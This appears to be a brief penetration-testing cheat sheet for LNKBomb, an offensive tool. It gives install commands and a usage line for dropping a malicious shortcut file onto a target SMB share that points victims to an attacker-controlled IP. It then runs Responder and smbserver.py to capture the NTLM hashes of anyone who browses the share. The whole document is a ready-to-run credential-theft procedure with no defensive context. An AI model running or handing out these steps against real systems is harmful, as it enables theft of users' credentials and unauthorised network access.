# LNKBomb

## 01 - Setup

Install required dependencies.

```
$ sudo apt install -y python3-colorama

$ pip install pysmb
```

Clone the repository

```
$ sudo git clone https://github.com/dievus/lnkbomb.git /opt/exploitation/lnkbomb/ && \
sudo ln -sf /opt/exploitation/lnkbomb/lnkbomb.py /usr/local/bin/lnkbomb && \
sudo chmod 755 /usr/local/bin/lnkbomb
```

## 02 - Usage

```
$ lnkbomb -t <target_IP> -a <attacker_IP> -s <share_name> -u <username> -p <password> -n <netbios_computername> -w [-r snare.url]
```

Then launch SMB server to capture NTLM hashes.

```
$ sudo responder -I <interface> -dwFP -v

$ smbserver.py . . -smb2support
```

---
## References

- [dievus: LNKBomb](https://github.com/dievus/lnkbomb)